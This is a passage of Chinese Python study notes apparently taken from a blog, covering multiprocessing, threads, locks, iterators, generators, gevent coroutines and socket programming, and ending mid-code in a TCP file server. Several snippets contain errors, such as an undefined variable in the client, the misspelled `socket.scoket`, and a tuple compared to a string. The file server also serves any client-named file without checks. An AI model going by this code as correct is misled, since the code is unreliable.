<h3 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="comment">#多进程文件夹拷贝</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_file</span><span class="params">(q, file_name, old_folder_name, new_folder_name)</span>:</span></span><br><span class="line">    <span class="comment">#print("=====&gt;copy文件(%s---&gt;%s)：%s" % (old_folder_name, new_folder_name, file_name))</span></span><br><span class="line">    old_f = open(old_folder_name + <span class="string">"/"</span> + file_name, <span class="string">'rb'</span>)</span><br><span class="line">    data = old_f.read()</span><br><span class="line">    old_f.close()</span><br><span class="line"></span><br><span class="line">    new_f = open(new_folder_name + <span class="string">'/'</span> + file_name, <span class="string">'wb'</span>)</span><br><span class="line">    new_f.write(data)</span><br><span class="line">    new_f.close()</span><br><span class="line"></span><br><span class="line">    q.put(file_name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    old_folder_name = input(<span class="string">"原文件夹："</span>)</span><br><span class="line">    new_folder_name = old_folder_name + <span class="string">"[1]"</span></span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        file_names = os.listdir(old_folder_name)    <span class="comment">#listdir()获取文件夹的所有文件的名字</span></span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"没有这个文件夹"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        os.mkdir(new_folder_name)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="comment">#print(file_names)</span></span><br><span class="line"></span><br><span class="line">    po = multiprocessing.Pool(<span class="number">5</span>)</span><br><span class="line">    queue = multiprocessing.Manager().Queue()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> file_name <span class="keyword">in</span> file_names:</span><br><span class="line">        po.apply_async(copy_file, args=(queue, file_name, old_folder_name, new_folder_name))</span><br><span class="line"></span><br><span class="line">    po.close()</span><br><span class="line">    <span class="comment">#po.join()</span></span><br><span class="line">    all_file_num = len(file_names)</span><br><span class="line">    copy_num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        file_name = queue.get()</span><br><span class="line">        copy_num += <span class="number">1</span></span><br><span class="line">        print(<span class="string">"\r拷贝的进度为：%.2f %%"</span> % (copy_num*<span class="number">100</span>/all_file_num), end=<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(all_file_num == copy_num):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    print()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h2><h3 id="threading模块"><a href="#threading模块" class="headerlink" title="threading模块"></a>threading模块</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">t1 = threading.Thread(target=sing)</span><br><span class="line">t1.start()</span><br><span class="line"></span><br><span class="line">threading.enumerate()	<span class="comment">#获取当前程序所有线程</span></span><br></pre></td></tr></table></figure>

<h3 id="封装"><a href="#封装" class="headerlink" title="封装"></a>封装</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            msg = <span class="string">"I'm"</span>+self.name+<span class="string">'@'</span>+str(i)</span><br><span class="line">            print(msg)</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    t = MyThread()</span><br><span class="line">    t.start()</span><br></pre></td></tr></table></figure>

<h3 id="全局变量，资源竞争"><a href="#全局变量，资源竞争" class="headerlink" title="全局变量，资源竞争"></a>全局变量，资源竞争</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#多线程共享全局变量</span></span><br><span class="line">t1 = threading.Thread(target=test1,args=(g_nums))</span><br></pre></td></tr></table></figure>

<h3 id="同步-锁"><a href="#同步-锁" class="headerlink" title="同步,锁"></a>同步,锁</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mutex = threading.Lock()	<span class="comment">#创建锁</span></span><br><span class="line"></span><br><span class="line">mutex.acquire()	<span class="comment">#锁定</span></span><br><span class="line"></span><br><span class="line">mutex.release() <span class="comment">#解锁</span></span><br></pre></td></tr></table></figure>

<h3 id="死锁"><a href="#死锁" class="headerlink" title="死锁"></a>死锁</h3><p>程序设计时尽量避免（银行家算法）</p>
<p>设置超时时间</p>
<h3 id="练习-1"><a href="#练习-1" class="headerlink" title="练习"></a>练习</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_msg</span><span class="params">(udp_socket, dest_ip, dest_port)</span>:</span></span><br><span class="line">    <span class="string">"""发送消息"""</span></span><br><span class="line">    <span class="comment">#获取要发送的内容</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        send_data = input(<span class="string">"请输入要发送的信息："</span>)</span><br><span class="line">        udp_socket.sendto(send_data.encode(<span class="string">"utf-8"</span>), (dest_ip, dest_port))</span><br><span class="line">        <span class="keyword">if</span>(send_data == <span class="string">'quit'</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">recv_msg</span><span class="params">(udp_socket)</span>:</span></span><br><span class="line">    <span class="string">"""接收数据"""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    </span><br><span class="line">        recv_data = udp_socket.recvfrom(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span>(recv_data == <span class="string">'quit'</span>):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        print(<span class="string">"%s:%s"</span> % (str(recv_data[<span class="number">1</span>]), recv_data[<span class="number">0</span>].decode(<span class="string">"utf-8"</span>)))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#创建套接字</span></span><br><span class="line">    udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line"></span><br><span class="line">    theport = int(input(<span class="string">"要监听的端口："</span>))</span><br><span class="line">    <span class="comment">#绑定信息</span></span><br><span class="line">    udp_socket.bind((<span class="string">""</span>,theport))</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    dest_ip = input(<span class="string">"请输入对方IP:"</span>)</span><br><span class="line">    dest_port = int(input(<span class="string">"请输入对方端口："</span>))</span><br><span class="line"></span><br><span class="line">    t_recv = threading.Thread(target=recv_msg, args=(udp_socket,))</span><br><span class="line">    t_send = threading.Thread(target=send_msg, args=(udp_socket, dest_ip, dest_port))</span><br><span class="line"></span><br><span class="line">    t_recv.start()</span><br><span class="line">    t_send.start()</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><h3 id="迭代器"><a href="#迭代器" class="headerlink" title="迭代器"></a>迭代器</h3><p><code>__iter__方法的返回值是一个迭代器，表示可迭代</code></p>
<p><code>既有__iter__方法，也有__next__表示迭代器</code></p>
<p>可迭代对象：list, tuple, dict, string等</p>
<h4 id="迭代器示例"><a href="#迭代器示例" class="headerlink" title="迭代器示例"></a>迭代器示例</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Classmate</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.names = list()</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(self, name)</span>:</span></span><br><span class="line">        self.names.append(name)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span> <span class="comment">#__iter__方法的返回值是一个迭代器，表示可迭代</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span> <span class="comment">#既有__iter__方法，也有__next__表示迭代器</span></span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; len(self.names):</span><br><span class="line">            ret = self.names[self.current_num]</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment">#停止迭代</span></span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">classmate = Classmate()</span><br><span class="line">classmate.add(<span class="string">'qwe'</span>)</span><br><span class="line">classmate.add(<span class="string">'asd'</span>)</span><br><span class="line">classmate.add(<span class="string">'zxc'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'是否可迭代对象：'</span>, isinstance(classmate, Iterable))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> classmate:</span><br><span class="line">    print(i)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>  其它： <code>range() &amp; xrange()</code></p>
</blockquote>
<h4 id="斐波纳契数列迭代器"><a href="#斐波纳契数列迭代器" class="headerlink" title="斐波纳契数列迭代器"></a>斐波纳契数列迭代器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Iterable</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FibIterabtor</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, n)</span>:</span></span><br><span class="line">        self.n = n</span><br><span class="line">        self.current_num = <span class="number">0</span></span><br><span class="line">        self.a = <span class="number">0</span></span><br><span class="line">        self.b = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> self.current_num &lt; self.n:</span><br><span class="line">            ret = self.a</span><br><span class="line"></span><br><span class="line">            self.a, self.b = self.b, self.a+self.b</span><br><span class="line">            self.current_num += <span class="number">1</span></span><br><span class="line">            <span class="keyword">return</span> ret</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> StopIteration</span><br><span class="line"></span><br><span class="line">fibo = FibIterabtor(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> num <span class="keyword">in</span> fibo:</span><br><span class="line">    print(num)</span><br></pre></td></tr></table></figure>

<h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>生成器是一种特殊的迭代器</p>
<p><code>num = [x*2 for x in range(10)]</code></p>
<p><code>nums = (x*2 for x in range(10))</code></p>
<h4 id="斐波纳契数列生成器"><a href="#斐波纳契数列生成器" class="headerlink" title="斐波纳契数列生成器"></a>斐波纳契数列生成器</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create_num</span><span class="params">(all_num)</span>:</span></span><br><span class="line">    a, b = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    current_num = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> current_num &lt; all_num:</span><br><span class="line">        <span class="keyword">yield</span> a     <span class="comment"># 只要有yield即为生成器</span></span><br><span class="line">        a, b = b, a+b</span><br><span class="line">        current_num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">"ok"</span></span><br><span class="line"></span><br><span class="line">y = create_num(<span class="number">10</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ret = next(y)</span><br><span class="line">        print(ret)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        print(e.value)      <span class="comment">#获取return的值</span></span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h3 id="协程-1"><a href="#协程-1" class="headerlink" title="协程"></a>协程</h3><h4 id="使用yiled完成多任务"><a href="#使用yiled完成多任务" class="headerlink" title="使用yiled完成多任务"></a>使用yiled完成多任务</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"---1---"</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"---2---"</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">yield</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    t1 = task_1()</span><br><span class="line">    t2 = task_2()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        next(t1)</span><br><span class="line">        next(t2)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h4 id="使用greenlet替换yiled"><a href="#使用greenlet替换yiled" class="headerlink" title="使用greenlet替换yiled"></a>使用greenlet替换yiled</h4><p><code>pip3 install greenlet</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> greenlet <span class="keyword">import</span> greenlet</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"---1---"</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        gr2.switch()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">task_2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        print(<span class="string">"---2---"</span>)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        gr1.switch()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gr1 = greenlet(task_1)</span><br><span class="line">gr2 = greenlet(task_2)</span><br><span class="line"></span><br><span class="line">gr1.switch()</span><br></pre></td></tr></table></figure>

<h4 id="使用gevent"><a href="#使用gevent" class="headerlink" title="使用gevent"></a>使用gevent</h4><p><code>pip3 install gevent</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        gevent.sleep(<span class="number">0.5</span>)       <span class="comment">#延时操作，切换协程</span></span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        gevent.sleep(<span class="number">0.5</span>)</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        gevent.sleep(<span class="number">0.5</span>)</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f1, <span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f2, <span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f3, <span class="number">5</span>)</span><br><span class="line">g1.join()       <span class="comment">#等待g1结束，属于延时操作</span></span><br><span class="line">g2.join()</span><br><span class="line">g3.join()</span><br></pre></td></tr></table></figure>

<h4 id="改进"><a href="#改进" class="headerlink" title="改进"></a>改进</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gevent</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> gevent <span class="keyword">import</span> monkey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">monkey.patch_all()      <span class="comment">#将延时操作更换为gevent的延时操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)       <span class="comment">#延时操作，切换协程</span></span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f2</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f3</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        print(gevent.getcurrent(), i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">g1 = gevent.spawn(f1, <span class="number">5</span>)</span><br><span class="line">g2 = gevent.spawn(f2, <span class="number">5</span>)</span><br><span class="line">g3 = gevent.spawn(f3, <span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># g1.join()       #等待g1结束，属于延时操作</span></span><br><span class="line"><span class="comment"># g2.join()</span></span><br><span class="line"><span class="comment"># g3.join()</span></span><br><span class="line"></span><br><span class="line">gevent.joinall([        <span class="comment">#等待列表所有程序结束</span></span><br><span class="line">    gevent.spawn(f1, <span class="number">5</span>),</span><br><span class="line">    gevent.spawn(f2, <span class="number">5</span>),</span><br><span class="line">    gevent.spawn(f2, <span class="number">5</span>)</span><br><span class="line">])</span><br></pre></td></tr></table></figure>

<h1 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h1><p>Python 提供了两个级别访问的网络服务。：</p>
<ul>
<li>低级别的网络服务支持基本的 Socket，它提供了标准的 BSD Sockets API，可以访问底层操作系统Socket接口的全部方法。</li>
<li>高级别的网络服务模块 SocketServer， 它提供了服务器中心类，可以简化网络服务器的开发。</li>
</ul>
<p>Socket又称”套接字”，应用程序通常通过”套接字”向网络发出请求或者应答网络请求，使主机间或者一台计算机上的进程间可以通讯。</p>
<h2 id="socket-函数"><a href="#socket-函数" class="headerlink" title="socket()函数"></a>socket()函数</h2><p>Python 中，我们用 socket（）函数来创建套接字，语法格式如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">socket.socket([family[, type[, proto]]])</span><br></pre></td></tr></table></figure>

<h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><ul>
<li>family: 套接字家族可以使AF_UNIX或者AF_INET</li>
<li>type: 套接字类型可以根据是面向连接的还是非连接分为<code>SOCK_STREAM</code>或<code>SOCK_DGRAM</code></li>
<li>protocol: 一般不填默认为0.</li>
</ul>
<h3 id="Socket-对象-内建-方法"><a href="#Socket-对象-内建-方法" class="headerlink" title="Socket 对象(内建)方法"></a>Socket 对象(内建)方法</h3><table>
<thead>
<tr>
<th>函数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>服务器端套接字</td>
<td></td>
</tr>
<tr>
<td>s.bind()</td>
<td>绑定地址（host,port）到套接字， 在AF_INET下,以元组（host,port）的形式表示地址。</td>
</tr>
<tr>
<td>s.listen()</td>
<td>开始TCP监听。backlog指定在拒绝连接之前，操作系统可以挂起的最大连接数量。该值至少为1，大部分应用程序设为5就可以了。</td>
</tr>
<tr>
<td>s.accept()</td>
<td>被动接受TCP客户端连接,(阻塞式)等待连接的到来</td>
</tr>
<tr>
<td>客户端套接字</td>
<td></td>
</tr>
<tr>
<td>s.connect()</td>
<td>主动初始化TCP服务器连接，。一般address的格式为元组（hostname,port），如果连接出错，返回socket.error错误。</td>
</tr>
<tr>
<td>s.connect_ex()</td>
<td>connect()函数的扩展版本,出错时返回出错码,而不是抛出异常</td>
</tr>
<tr>
<td>公共用途的套接字函数</td>
<td></td>
</tr>
<tr>
<td>s.recv()</td>
<td>接收TCP数据，数据以字符串形式返回，bufsize指定要接收的最大数据量。flag提供有关消息的其他信息，通常可以忽略。</td>
</tr>
<tr>
<td>s.send()</td>
<td>发送TCP数据，将string中的数据发送到连接的套接字。返回值是要发送的字节数量，该数量可能小于string的字节大小。</td>
</tr>
<tr>
<td>s.sendall()</td>
<td>完整发送TCP数据，完整发送TCP数据。将string中的数据发送到连接的套接字，但在返回之前会尝试发送所有数据。成功返回None，失败则抛出异常。</td>
</tr>
<tr>
<td>s.recvfrom()</td>
<td>接收UDP数据，与recv()类似，但返回值是（data,address）。其中data是包含接收数据的字符串，address是发送数据的套接字地址。</td>
</tr>
<tr>
<td>s.sendto()</td>
<td>发送UDP数据，将数据发送到套接字，address是形式为（ipaddr，port）的元组，指定远程地址。返回值是发送的字节数。</td>
</tr>
<tr>
<td>s.close()</td>
<td>关闭套接字</td>
</tr>
<tr>
<td>s.getpeername()</td>
<td>返回连接套接字的远程地址。返回值通常是元组（ipaddr,port）。</td>
</tr>
<tr>
<td>s.getsockname()</td>
<td>返回套接字自己的地址。通常是一个元组(ipaddr,port)</td>
</tr>
<tr>
<td>s.setsockopt(level,optname,value)</td>
<td>设置给定套接字选项的值。</td>
</tr>
<tr>
<td>s.getsockopt(level,optname[.buflen])</td>
<td>返回套接字选项的值。</td>
</tr>
<tr>
<td>s.settimeout(timeout)</td>
<td>设置套接字操作的超时期，timeout是一个浮点数，单位是秒。值为None表示没有超时期。一般，超时期应该在刚创建套接字时设置，因为它们可能用于连接的操作（如connect()）</td>
</tr>
<tr>
<td>s.gettimeout()</td>
<td>返回当前超时期的值，单位是秒，如果没有设置超时期，则返回None。</td>
</tr>
<tr>
<td>s.fileno()</td>
<td>返回套接字的文件描述符。</td>
</tr>
<tr>
<td>s.setblocking(flag)</td>
<td>如果flag为0，则将套接字设为非阻塞模式，否则将套接字设为阻塞模式（默认值）。非阻塞模式下，如果调用recv()没有发现任何数据，或send()调用无法立即发送数据，那么将引起socket.error异常。</td>
</tr>
<tr>
<td>s.makefile()</td>
<td>创建一个与该套接字相关连的文件</td>
</tr>
</tbody></table>
<h2 id="Python-Internet-模块"><a href="#Python-Internet-模块" class="headerlink" title="Python Internet 模块"></a>Python Internet 模块</h2><p>以下列出了 Python 网络编程的一些重要模块：</p>
<table>
<thead>
<tr>
<th>协议</th>
<th>功能用处</th>
<th>端口号</th>
<th>Python 模块</th>
</tr>
</thead>
<tbody><tr>
<td>HTTP</td>
<td>网页访问</td>
<td>80</td>
<td>httplib, urllib, xmlrpclib</td>
</tr>
<tr>
<td>NNTP</td>
<td>阅读和张贴新闻文章，俗称为”帖子”</td>
<td>119</td>
<td>nntplib</td>
</tr>
<tr>
<td>FTP</td>
<td>文件传输</td>
<td>20</td>
<td>ftplib, urllib</td>
</tr>
<tr>
<td>SMTP</td>
<td>发送邮件</td>
<td>25</td>
<td>smtplib</td>
</tr>
<tr>
<td>POP3</td>
<td>接收邮件</td>
<td>110</td>
<td>poplib</td>
</tr>
<tr>
<td>IMAP4</td>
<td>获取邮件</td>
<td>143</td>
<td>imaplib</td>
</tr>
<tr>
<td>Telnet</td>
<td>命令行</td>
<td>23</td>
<td>telnetlib</td>
</tr>
<tr>
<td>Gopher</td>
<td>信息查找</td>
<td>70</td>
<td>gopherlib, urllib</td>
</tr>
</tbody></table>
<h2 id="练习-2"><a href="#练习-2" class="headerlink" title="练习"></a>练习</h2><h3 id="tcp文件下载器"><a href="#tcp文件下载器" class="headerlink" title="tcp文件下载器"></a>tcp文件下载器</h3><p>client.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#创建socket</span></span><br><span class="line">    tcp_client_socket = socket(AF_INET, SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 目的信息</span></span><br><span class="line">    server_ip = input(<span class="string">"请输入服务器IP："</span>)</span><br><span class="line">    server_port = int(input(<span class="string">"请输入服务器port"</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 链接服务器</span></span><br><span class="line">    tcp_client_socket.connect((server_ip, server_port))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#输入需要下载的文件名</span></span><br><span class="line">    tcp_client_socket.send(file_name.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="comment">#接收对方发送过来的数据，最大接受1024个字节</span></span><br><span class="line">    recv_data = tcp_client_socket.recv(<span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> recv_data:</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">"[接收]"</span>+file_name, <span class="string">"wb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            f.write(recv_data)</span><br><span class="line">    </span><br><span class="line">    tcp_client_socket.close()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>server.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_file_2_client</span><span class="params">(new_client_socket, client_addr)</span>:</span></span><br><span class="line">    file_name = new_client_socket.recv(<span class="number">1024</span>).decode(<span class="string">"utf-8"</span>)</span><br><span class="line">    print(<span class="string">"客户端(%s)需要下载的文件是：%s"</span> % (str(client_addr),file_name))</span><br><span class="line">    file_content = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f = open(file_name,<span class="string">'rb'</span>)</span><br><span class="line">        file_content = f.read()</span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> ret:</span><br><span class="line">        print(<span class="string">"没有要下载的文件(%s)"</span> % file_name)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> file_content:</span><br><span class="line">        new_client_socket.send(file_content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    tcp_server_socket = socket.scoket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    </span><br><span class="line">    tcp_server_socket.bind((<span class="string">""</span>,<span class="number">7890</span>))</span><br><span class="line">    </span><br><span class="line">    tcp_server_socket.listen(<span class="number">128</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        new_client_socket, client_addr = tcp_server_socket.accept()</span><br><span class="line">    </span><br><span class="line">        send_file_2_client(new_client_socket, client_addr)</span><br><span class="line">    </span><br><span class="line">        